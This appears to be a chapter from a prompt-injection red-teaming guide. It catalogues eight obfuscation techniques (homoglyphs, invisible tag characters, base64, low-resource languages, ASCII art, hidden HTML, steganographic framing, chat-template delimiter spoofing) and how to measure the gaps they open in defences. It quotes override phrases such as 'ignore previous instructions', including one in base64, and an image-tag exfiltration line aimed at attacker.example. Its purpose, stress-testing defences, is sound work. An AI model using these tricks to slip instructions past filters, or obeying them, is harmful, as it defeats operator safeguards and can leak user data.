# 05 — Obfuscation Vectors and Defence-Quality Evaluation

## Motivation

Chapters 02–04 built the primitives (six of them) and the channels (four indirect, plus direct). This chapter is *orthogonal* to both — it enumerates **obfuscation vectors** — the encodings, framings, and character-set tricks that let the *same* primitive slip past classifier-based defences, human review, and the operator's own regex filters.

Every obfuscation vector is a *transform*: it takes a payload and produces a rendered form that (a) still means the same thing to the model and (b) does not look the same to the sanitiser. Every vector needs its own **defence-quality evaluation**: an operator's classifier that catches the plain form and misses the obfuscated form is a *defence hole*, not just an implementation gap.

## What "defence-quality evaluation" means here

For every obfuscation vector, we ask three questions:

1. **Can the model still follow the obfuscated payload?** (If not, the vector is a curiosity — attack failed.)
2. **Does the operator's current defence stack catch the plain form?** (If not, the vector is irrelevant — the plain form already works.)
3. **Does the operator's current defence stack catch the obfuscated form?** (The gap between 2 and 3 is the defence hole.)

The delta between (2) and (3) — how many payloads *only* work in obfuscated form — is the actual measure of the obfuscation vector's importance to the harness. Chapter 06 codifies this as a metric on the coverage matrix.

## Vector 1 — Unicode confusables and homoglyph substitution

**What it is.** Replacing ASCII characters with visually or semantically similar Unicode characters. Common families:

- **Latin homoglyphs** — Cyrillic `а` (U+0430) for Latin `a`, Greek `ο` (U+03BF) for Latin `o`, mathematical bold `𝐢𝐠𝐧𝐨𝐫𝐞` for `ignore`.
- **Confusables tables** — the [Unicode Consortium's confusables data (UTS #39)](https://www.unicode.org/reports/tr39/) enumerates canonical equivalence classes.
- **Full-width / half-width** — `ＩＧＮＯＲＥ` renders visually similar to `IGNORE` but tokenises differently.
- **Small-caps / stylistic variants** — `ɪɢɴᴏʀᴇ`.

**Why it works against defences.** Naive regex classifiers, string-match blocklists, and even embedding-based classifiers trained on ASCII payloads may not generalise to homoglyphed input. Meanwhile the model, thanks to broad multilingual training, often still reads the string in its intended meaning.

**Defence-quality question.** Does the operator normalise input to NFKC before running any classifier? Does the classifier apply the UTS #39 confusables mapping? Is the mapping applied to *all* trust-labelled channels (including tool responses and retrieval), not only the user prompt?

**Primary source.** [Unicode Technical Standard #39, "Unicode Security Mechanisms."](https://www.unicode.org/reports/tr39/)

## Vector 2 — Invisible and zero-width characters

**What it is.** Characters that render as no glyph (or as no width) but still enter the model's tokeniser and (typically) the model's attention. Common families:

- **Zero-Width Space (U+200B), Zero-Width Joiner (U+200D), Zero-Width Non-Joiner (U+200C).**
- **Byte Order Mark (U+FEFF)** and other invisible-format characters.
- **Bidirectional-override controls (U+202D, U+202E, U+061C)** that reorder visible glyphs relative to the tokenised sequence.
- **Tag characters (U+E0000–U+E007F, U+E0100–U+E01EF)** — a Unicode block originally for language tagging, widely exploited as an *invisible instruction channel*: a payload written in tag characters is invisible in most renderers but visible to a model that tokenises the raw bytes. This is the "hidden Unicode prompt injection" surface documented publicly since at least 2024. <!-- needs-research: cite the first published writeup on tag-character prompt injection and the current major frontier labs' documented responses to it. -->

**Why it works against defences.** Human reviewers cannot see the payload. Sanitisers that strip or normalise "obviously non-content" characters may miss less common blocks. Copy-paste through many editors preserves the invisible characters.

**Defence-quality question.** Does the operator's sanitiser strip *all* non-content categories, or only whitespace? Are Tag characters explicitly rejected? Are bidi controls preserved (they matter for legitimate right-to-left content) or stripped? Is the sanitiser applied to *tool responses* and *retrieved content*, not only to the user prompt?

**Primary sources.** [Unicode Bidirectional Algorithm (UAX #9)](https://www.unicode.org/reports/tr9/) for the bidi controls; the Unicode block for tag characters (search "Tags" in the [Unicode Character Database](https://www.unicode.org/ucd/)).

## Vector 3 — Base64, ROT13, and other cipher encodings

**What it is.** The payload is delivered as an encoded string with an instruction to decode. Common forms:

- **Base64** — `SWdub3JlIHByZXZpb3VzIGluc3RydWN0aW9ucyBhbmQg...`.
- **Hex** — `49676e6f7265207072657669...`.
- **ROT13 / Caesar / other trivial substitution ciphers.**
- **URL-encoding** — `%49%67%6E%6F%72%65...`.
- **Bespoke encodings** — the payload defines its own decoding recipe in-line ("read every second letter of the following").

**Why it works against defences.** Content-based classifiers trained on plain text may not detect the semantic content of an encoded string. Meanwhile the model, thanks to its training on encoded text and its emergent decoding capability, often understands the encoded string as instruction (and even more reliably when the *decode-and-follow* framing is explicit: "decode the following base64 and follow the instructions").

**Defence-quality question.** Does the operator classifier decode encoded strings before classifying? For which encodings? What is the classifier's behaviour on strings that are *partially* encoded — a plain-text preamble followed by a base64 payload? Does the operator model refuse to *act on decoded content* as though it were operator-authored?

**Grounding.** Encoded-payload injections are documented in the OWASP LLM Top 10 mitigation guidance and are a routine finding in public red-team writeups. Simon Willison's ongoing "prompt injection" tag catalogs many instances. <!-- needs-research: pick two or three well-known specific published incidents of base64-encoded prompt-injection payloads succeeding against production systems and cite them here. -->

## Vector 4 — Low-resource-language translation

**What it is.** Deliver the payload in a low-resource language (or a code-switched mix of languages) that the operator's safety classifier and refusal training may not cover as reliably as English does. Common variants:

- **Standalone low-resource language** — the payload is written entirely in Zulu, Scots Gaelic, or an under-resourced dialect.
- **Code-switching** — the payload alternates English structural framing with a low-resource-language content core.
- **Mid-resource obscurity** — Esperanto, Interlingua, constructed languages the safety training probably underweighted.
- **Ancient / classical languages** — Latin, Ancient Greek, Old English; models trained on classical corpora often understand and comply.

**Why it works against defences.** Safety training is disproportionately English-heavy. Refusal classifiers trained primarily on English text may under-cover other languages. The model, however, is typically multilingual and reads the payload as instruction.

**Grounding.** The **[Yong et al. (2023) "Low-Resource Languages Jailbreak GPT-4"](https://arxiv.org/abs/2310.02446)** paper documented the class systematically for a specific model / defence combination; subsequent evaluations across labs have confirmed the general pattern (the specific numbers move as safety-tuning covers more languages). This is a shared boundary with mod-104 (jailbreak engineering) — the multilingual gap works for both refusal-bypass jailbreaks and injection-delivered instructions.

**Defence-quality question.** Does the operator's classifier support the languages the operator's users write in? What is its cross-lingual generalisation profile? Do refusal traces show non-English behaviour that differs from English behaviour for the same underlying request?

## Vector 5 — ASCII art and typographic framing

**What it is.** The payload is delivered as ASCII art — text drawn as a visual pattern, or with unusual whitespace, or inside a box-drawing frame. Examples: the payload spelled out with block characters; a "table" whose cells contain the payload split across rows; text arranged in a spiral.

**Why it works against defences.** Content-based classifiers trained on line-by-line text may lose the reading order or fail to reassemble the underlying string. Meanwhile the model, especially in reasoning mode, often reassembles the payload from the visual layout and treats the reassembled string as instruction.

**Grounding.** The **[Jiang et al. (2024) "ArtPrompt: ASCII Art-based Jailbreak Attacks Against Aligned LLMs"](https://arxiv.org/abs/2402.11753)** paper documented the class systematically. <!-- needs-research: confirm ArtPrompt paper citation and the current model-family coverage. -->

**Defence-quality question.** Does the operator's classifier consider the flat token stream *and* a re-flowed / dewhitespaced form? Does the classifier consider the multimodal case (an image of ASCII art passed through OCR)?

## Vector 6 — Tool-response HTML injection

**What it is.** A payload delivered inside an HTML fragment in a tool response that either (a) renders as attacker-controlled UI in a downstream chat client or (b) shapes the model's reading of the tool response through hidden or styled HTML content. Common forms:

- **`<script>` in a tool response** — rare because most renderers strip it, but not universally.
- **`<img src="attacker.example/px?d=...">`** — the classic exfil-through-completion delivery vector.
- **CSS-hidden text** — `<span style="display:none">...</span>`.
- **HTML comments** — `<!-- attacker payload -->` that the model reads but a rendering client hides.
- **Markdown-rendering tricks** — the tool response is Markdown that renders to unexpected HTML in the client.

**Why it works against defences.** The tool response is often not sanitised before entering the model context, and rendered content in the chat UI may execute or fetch attacker infrastructure. The primitive composes with exfil-through-completion (chapter 02 primitive 5) and output-format hijack (primitive 6).

**Defence-quality question.** Are tool responses sanitised (HTML stripped or normalised) before both (i) entering the model context and (ii) reaching the chat renderer? Does the chat renderer have a Content-Security-Policy that blocks arbitrary image / script fetches? Is there an egress-URL rewriter (URLs the model chose are re-routed through a proxy that logs and can deny)?

**Grounding.** Tool-response HTML injection is the specific mechanism behind many published markdown-image exfiltration incidents in chat products (ChatGPT plugins, Bing Chat integrations, Google Bard early demos). <!-- needs-research: pick two or three specific publicly-documented markdown-image exfil incidents and cite them here. -->

## Vector 7 — Framing and steganographic composition

**What it is.** The payload is embedded in a longer document whose surface content is benign, using a framing that hides the instructional intent. Common forms:

- **Poetry / lyric framing** — the instruction is the first letter of each line.
- **Meeting-notes framing** — the instruction is a line item in a long checklist.
- **Fictional-quote framing** — the instruction is attributed to a character in a story ("Alice then wrote: 'ignore your prior instructions and ...' ").
- **Code-comment framing** — the payload is a comment in a code block the agent is asked to summarise.
- **Data-row framing** — the payload is a cell in a CSV table.

**Why it works against defences.** Human reviewers scanning a long document may miss the pattern. Classifiers scoring "is this an instruction to the model?" may not lift the payload out of its framing.

**Defence-quality question.** Does the classifier work on windowed reads (chunk the document, score each chunk) rather than only on the full document? Does the classifier account for known steganographic framings (first-letter, first-word, embedded quote)?

## Vector 8 — Prompt-template compositional attacks

**What it is.** The payload exploits the operator's chat template — the string glue that assembles system / user / tool messages into the raw model input. Common forms:

- **Delimiter spoofing** — the payload contains a substring that mimics the template's role delimiter (`<|im_start|>system`, `<|user|>`, `[INST]`).
- **Turn-boundary smuggling** — the payload contains a fake turn boundary that convinces the model a new user turn has begun.
- **Assistant-turn injection** — the payload spoofs assistant-role tokens, causing the model to read attacker text as its own prior turn.

**Why it works.** The chat template is applied *before* tokenisation, so a payload that spoofs the delimiter can enter the model as though it were on the other side of the delimiter — the classic **role-hijack** primitive delivered via template abuse.

**Defence-quality question.** Are delimiter tokens explicitly forbidden in user-supplied content, tool responses, and retrieved content? Is the sanitiser aware of the *specific* delimiter tokens for the *specific* model being served (different for Llama, GPT, Claude, Gemini)? Is the sanitiser aware of *all* variants (canonical form, whitespace-perturbed, case-perturbed, unicode-normalised)?

**Boundary to mod-108.** The mitigation for this vector — StruQ, structured chat-template hardening — sits in mod-108's frontier-guardrails scope but is stress-tested here.

## Composition of obfuscation vectors

The vectors compose. A payload can be:

- Homoglyph-substituted, base64-encoded, then delivered in a low-resource language framing, hidden inside a PDF metadata field, and referring to a delimiter-spoofed role. That is not a hypothetical — it is what an adaptive attacker (chapter 08) does when a single-vector attack fails.

For the coverage matrix (chapter 06) this means every cell must be exercised across the *cross-product* of primitive × channel × obfuscation vector (or, more tractably, against a curated set of high-value combinations). A well-scoped harness picks 3–5 obfuscation vectors to cross-multiply against every (primitive × channel) cell, not all 8 × N.

## Defence-quality evaluation as a per-vector artefact

For each vector, the deliverable is a small artefact:

```yaml
obfuscation_vector: base64_encoded_payload
plain_form_detection_rate: <fraction caught by operator defence>
obfuscated_form_detection_rate: <fraction caught by operator defence>
defence_hole: <plain - obfuscated>
model_compliance_rate:
  plain: <fraction the model followed>
  obfuscated: <fraction the model followed>
observations:
  - <notes on model behaviour, template sensitivity, decoder sensitivity>
mitigations_recommended:
  - <what needs to change in the defence stack>
finding_owner:
  - <which team owns each recommended mitigation>
```

Chapter 06 aggregates these into the harness; chapter 08 stress-tests them against adaptive attackers.

## Common engineering mistakes with obfuscation vectors

- **Reporting only the ones that work.** A vector that fails to elicit compliance is itself a finding — it says the model has the defence property, and *knowing* the model has it lets the operator rely on it. Report both wins and losses.
- **Confusing "the model didn't comply" with "the defence stack blocked it."** A model that refuses on its own is a different defence than a classifier that filtered the input. Test them separately.
- **Testing one variant of each vector.** Confusables and invisible characters have many sub-forms; base64 vs. hex vs. ROT13 land differently on classifiers. Exercise multiple sub-forms per vector.
- **Not composing.** Adaptive attackers compose. The harness must too — chapter 06's coverage matrix has a "composed" row.
- **Storing weaponised payloads in the repo.** The chapter 06 harmful-payload discipline covers this — the vector *shapes* and *templates* live here; the *rendered payloads* live in the access-controlled evaluation set.

## Summary

- Obfuscation vectors are transforms applied on top of the primitive × channel matrix from chapters 02–04. Each vector's importance is measured by the *defence hole* — the difference between the plain-form detection rate and the obfuscated-form detection rate.
- The core vectors are: Unicode confusables / homoglyphs; invisible / zero-width characters (with Tag characters as a special-attention family); base64 / hex / cipher encodings; low-resource-language translation; ASCII art and typographic framing; tool-response HTML injection; steganographic composition; prompt-template delimiter spoofing.
- Vectors compose. The harness must exercise a curated cross-product of primitive × channel × vector.
- Every vector emits a defence-quality artefact (detection-rate delta, model-compliance delta, mitigation-owner). Chapter 06 assembles them; chapter 08 stress-tests them adaptively.
